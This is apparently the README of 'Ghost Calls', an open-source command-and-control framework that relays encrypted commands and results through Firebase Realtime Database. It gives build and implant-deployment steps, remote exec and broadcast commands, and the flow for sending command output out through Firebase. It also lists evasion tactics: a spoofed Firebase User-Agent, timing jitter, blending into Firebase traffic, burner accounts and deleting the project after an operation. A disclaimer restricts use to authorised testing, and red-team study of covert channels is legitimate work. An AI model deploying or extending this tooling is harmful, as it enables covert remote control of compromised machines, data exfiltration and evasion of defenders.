# Ghost Calls — Push Notification C2

**Ghost Calls** is a Command & Control (C2) framework that uses **Firebase Cloud Messaging (FCM)** and **Firebase Realtime Database** as command delivery channels. Commands are delivered through legitimate Firebase infrastructure — traffic goes to `firebaseio.com` and `googleapis.com`, domains that billions of devices talk to daily.

## Architecture

```
┌─────────────┐       ┌────────────────────────────┐       ┌─────────────┐
│  Operator    │──────▶│  Firebase Realtime DB      │◀──────│  Implant    │
│  (Server)    │       │  (Dead-drop / PubSub)      │       │  (Client)   │
└─────────────┘       └────────────────────────────┘       └─────────────┘
     │                         │                                 │
     │  HTTPS PUT             │  REST API                       │  HTTPS GET
     │  commands/<id>.json    │  (over HTTPS)                   │  commands/<id>.json
     │                         │                                 │
     │                         │                                 │
     │  HTTPS GET              │                                 │  HTTPS PUT
     │  results/<id>.json     │                                 │  results/<id>/<cmd>.json
     │                         │                                 │
     │  (Optional)             │                                 │  DELETE
     │  FCM HTTP v1 API       │                                 │  commands/<id>.json
     └────▶ FCM Send ─────────▶  Push notification ─────────────┘
```

### How It Works

1. **Command Injection** — The operator writes an encrypted command to the Firebase Realtime Database at `commands/<implant-id>.json`
2. **Polling** — The implant periodically reads its command path over HTTPS
3. **Execution** — The implant decrypts and executes the command via `/bin/sh -c` (or `cmd.exe /C` on Windows)
4. **Exfiltration** — The implant encrypts the output and writes it to `results/<implant-id>/<command-id>.json`
5. **Cleanup** — The implant deletes the command from Firebase, signaling it's been processed
6. **Collection** — The operator fetches results from `results/<implant-id>/` at any time

### Why Firebase?

| Feature | Benefit |
|---|---|
| **Domain reputation** | `firebaseio.com`, `googleapis.com` — billions of legitimate requests daily |
| **TLS by default** | All traffic is HTTPS, indistinguishable from legitimate Firebase SDK traffic |
| **No custom server** | Your C2 infrastructure is Firebase's infrastructure |
| **WebSocket fallback** | RTDB uses WebSockets when available — looks like normal Firebase sync |
| **Global CDN** | Low-latency from anywhere |
| **Free tier** | 1GB stored, 10GB/month download — plenty for a C2 operation |

## Quick Start

### 1. Prerequisites

- Go 1.21+ (for building)
- A Firebase project (see [FIREBASE_SETUP.md](FIREBASE_SETUP.md) for detailed instructions)
- The Firebase Realtime Database URL (looks like `https://my-project-default-rtdb.firebaseio.com`)
- A shared encryption secret (the `GHOST_SECRET`)

### 2. Build

```bash
# Build the server (operator console)
cd cmd/server
go build -o ../../bin/ghost-server .

# Build the client (implant)
cd cmd/client
go build -o ../../bin/ghost-client .
```

Or build everything at once:

```bash
mkdir -p bin
go build -o bin/ghost-server ./cmd/server
go build -o bin/ghost-client ./cmd/client
```

### 3. Configure Firebase

Set your database rules to allow read/write:

```json
{
  "rules": {
    ".read": true,
    ".write": true
  }
}
```

> **Warning:** Wide-open rules are for testing only. For production, use Firebase Authentication or custom tokens. See the OpSec section below.

### 4. Start the Server

```bash
export FIREBASE_URL="https://my-project-default-rtdb.firebaseio.com"
export GHOST_SECRET="your-very-secret-key-change-this"
export GHOST_PORT="9090"

./bin/ghost-server
```

### 5. Deploy an Implant

```bash
./bin/ghost-client \
  --project "my-project" \
  --id "target-001" \
  --secret "your-very-secret-key-change-this" \
  --interval 30s \
  --jitter 15s
```

### 6. Register and Send Commands

From the server console:

```
ghost> register target-001
[+] Registered implant target-001
ghost> list
ID                       FCM Token                              Last Seen
─────────────────────────────────────────────────────────────────────────
target-001               -                                      2026-05-11T22:00:00Z
ghost> exec target-001 uname -a
ghost> exec target-001 whoami
ghost> exec target-001 curl -s http://internal-service.local/status
ghost> results target-001
```

## Server Commands

| Command | Description |
|---|---|
| `register <id> [fcm_token]` | Register an implant (optionally with FCM token) |
| `exec <id> <command>` | Send a command to a specific implant |
| `broadcast <command>` | Send command to all registered implants |
| `list` | List all registered implants with metadata |
| `results <id>` | Fetch and display results from an implant |
| `forget <id>` | Remove an implant registration |
| `status` | Display server configuration and overview |
| `push <id> <json>` | Send raw FCM push payload (for testing) |
| `help` | Display help |
| `exit` | Shut down the server |

## Client Flags

| Flag | Default | Description |
|---|---|---|
| `--project` | — | Firebase project ID (e.g., `my-project`) |
| `--db-url` | — | Full Firebase RTDB URL (overrides `--project`) |
| `--id` | — | **Required.** Unique implant identifier |
| `--secret` | — | **Required.** Encryption secret (must match server) |
| `--interval` | `30s` | Base poll interval |
| `--jitter` | `15s` | Max random jitter added to each poll |
| `--verbose` | `false` | Enable verbose logging |

### Persistence

The implant writes its identity to `/etc/ghost/id` and secret to `/etc/ghost/secret` on first run. On subsequent runs, if `--id` is omitted, it reads from `/etc/ghost/id`. This allows pre-provisioning the implant by writing these files.

## Encryption

All command data is **encrypted at rest** in Firebase using **AES-256-GCM** before it ever leaves the server.

### Key Derivation

```
key = SHA-256(implant_id + ":" + server_secret)
```

- Each implant gets a **unique encryption key** derived from its ID + the shared server secret
- If an implant is compromised, only that implant's key is recoverable (assuming the server secret stays safe)
- The server secret itself is never stored in Firebase

### Encryption Flow

```
Server:
  1. Derive key from implant ID + GHOST_SECRET
  2. Encrypt command with AES-256-GCM (random nonce prepended)
  3. Base64-encode ciphertext
  4. Write to Firebase: { "cmd": "<base64>", "id": "<uuid>", "ts": <ms> }

Implant:
  1. Read from Firebase
  2. Base64-decode ciphertext
  3. Derive same key from implant ID + secret
  4. Decrypt with AES-256-GCM
  5. Execute command

Result encryption follows the same pattern (encrypted with the same derived key).
```

## OpSec Notes

### Traffic Analysis

- **All traffic is HTTPS** to `firebaseio.com` — indistinguishable from legitimate Firebase SDK traffic
- The implant uses a `User-Agent: Firebase/8.10.0 (Android; Google; SDK)` header to blend in
- Poll intervals with random jitter (±15s by default) avoid deterministic timing fingerprints
- `DisableKeepAlives: true` prevents persistent connections that could be fingerprinted

### Database Rules

**Development** (open to all):
```json
{
  "rules": {
    ".read": true,
    ".write": true
  }
}
```

**Production** (with Firebase Auth):
```json
{
  "rules": {
    "commands": {
      "$implant_id": {
        ".read": "auth != null",
        ".write": "auth != null"
      }
    },
    "results": {
      "$implant_id": {
        ".read": "auth != null",
        ".write": "auth != null"
      }
    }
  }
}
```

**Locked down** (custom auth token required):
```json
{
  "rules": {
    "commands": {
      "$implant_id": {
        ".read": "auth.uid === $implant_id",
        ".write": "auth.uid === 'server'"
      }
    },
    "results": {
      "$implant_id": {
        ".read": "auth.uid === 'server'",
        ".write": "auth.uid === $implant_id"
      }
    }
  }
}
```

### Encryption at Rest

- Commands are **always encrypted** before being written to Firebase
- The Firebase database never sees plaintext command data
- Even with database admin access, an adversary sees only base64 ciphertext
- **Never** use the server secret in the database rules or command payloads

### Rate Limiting

- Firebase Realtime Database has rate limits: roughly 200 simultaneous connections, 10MB/min write, 10K/min writes per project (free tier)
- Implants should use jittered intervals of 30s+ to avoid triggering rate limits
- For large deployments, consider staggering implant start times
- Upgrade to Blaze plan for higher limits in production operations

### Operational Security

1. **Use a burner Google account** to create the Firebase project — never link to personal accounts
2. **Enable Firebase Auth** with email/password or custom tokens for production use
3. **Rotate the GHOST_SECRET** between operations
4. **Use unique implant IDs** — never reuse across targets
5. **Consider using Firebase App Check** for additional verification
6. **Delete the Firebase project entirely** after the operation

## FCM Integration (Advanced)

The current implementation uses the Realtime Database as a dead-drop mechanism. For push-based command delivery (instant delivery without polling), you need:

1. Enable Firebase Cloud Messaging in your Firebase project
2. An Android app (or a device with FCM capability) on the target
3. The implant registers for FCM and sends its registration token to the server
4. The server uses the FCM HTTP v1 API to push commands directly to the device

An FCM push-based approach is more sophisticated and harder to detect, but requires:
- More complex implant code (FCM SDK or manual HTTP/2 push handling)
- An Android/iOS runtime or a way to register for push notifications
- Higher OpSec requirements (Google Play Services integration)

The RTDB dead-drop approach achieves the same goal with less complexity and broader platform support.

## DISCLAIMER

For authorized Security Testing or Educational Purposes only.
